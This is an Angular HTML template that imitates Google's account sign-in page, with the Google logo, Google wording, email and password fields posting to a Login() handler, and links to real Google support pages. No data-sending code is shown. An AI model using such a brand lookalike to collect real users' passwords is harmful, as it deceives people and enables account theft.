<div class="login-container">
    <div class="login-card">

        <div class="left-section">
            <img src="images/Google_Icon.png" alt="Google Logo">
            <h1>Sign in</h1>
            <p>with your Google Account. This account will be available to other Google apps in the browser.</p>
        </div>
    <form [formGroup]="loginForm" (ngSubmit)="Login()">
        <div class="right-section">
            <div class="form-group">
                <mat-form-field appearance="outline">
                    <mat-label>Email or Phone</mat-label>
                    <input matInput placeholder="Email or Phone" formControlName="email">
                </mat-form-field>

                <mat-form-field appearance="outline">
                    <mat-label>Password</mat-label>
                    <input matInput placeholder="Password" type="password" formControlName="password">
                </mat-form-field>
            </div>

            <button mat-button color="primary">Forgot email?</button>

            <p class="info-text">
                Not your computer? Use Guest mode to sign in privately.
                <a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more about using Guest mode</a>
            </p>

            <div class="actions">
                <button mat-button color="primary">Create account</button>
                <button mat-flat-button color="primary">Next</button>
            </div>
        </div>
    </form>
    </div>
</div>

<footer>
    <ul>
        <li><a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a></li>
        <li><a href="https://accounts.google.com/TOS?loc=IN&hl=en&privacy=true" target="_blank">Privacy</a></li>
        <li><a href="https://accounts.google.com/TOS?loc=IN&hl=en" target="_blank">Terms</a></li>
    </ul>
</footer>
